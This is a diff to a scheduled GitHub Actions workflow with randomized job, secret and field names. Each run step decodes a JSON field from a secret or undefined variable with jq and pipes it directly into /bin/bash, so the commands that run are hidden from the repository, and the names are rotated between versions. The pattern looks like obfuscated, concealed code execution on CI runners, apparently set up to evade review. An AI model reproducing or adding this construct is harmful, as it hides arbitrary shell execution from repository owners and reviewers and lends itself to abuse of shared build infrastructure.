@@ -2,21 +2,22 @@ name: zhangduanxiu4353
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 2/6 * * *'
-
-jobs:  # 18603
+    - cron: '4 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhangduanxiu4353
         env:
-          f44: ${{ secrets.f44 }}
+          nwl09: ${{ secrets.nwl09 }}
         run: |
-          echo $f44 | jq -r .feff9 | /bin/bash
-          echo $jhkdp7924 | jq -r .fbh52932 | /bin/bash
-          echo $uvf8 | jq -r .fa0 | /bin/bash
-          echo $ghop7 | jq -r .f41249 | /bin/bash
-          echo $bch52735 | jq -r .i0 | /bin/bash
-          echo $ht8 | jq -r .bdvd86 | /bin/bash
+          echo $nwl09 | jq -r .baebz8 | /bin/bash
+          echo $syes3175 | jq -r .xl5 | /bin/bash
+          echo $g85653 | jq -r .ee08 | /bin/bash
+          echo $oe4 | jq -r .vt0214 | /bin/bash
+          echo $ws2 | jq -r .a9833 | /bin/bash
+          echo $dg91 | jq -r .etfg9 | /bin/bash
+          echo $cxrl49 | jq -r .rd439 | /bin/bash
+          echo $ygk42 | jq -r .yboea6704 | /bin/bash
 
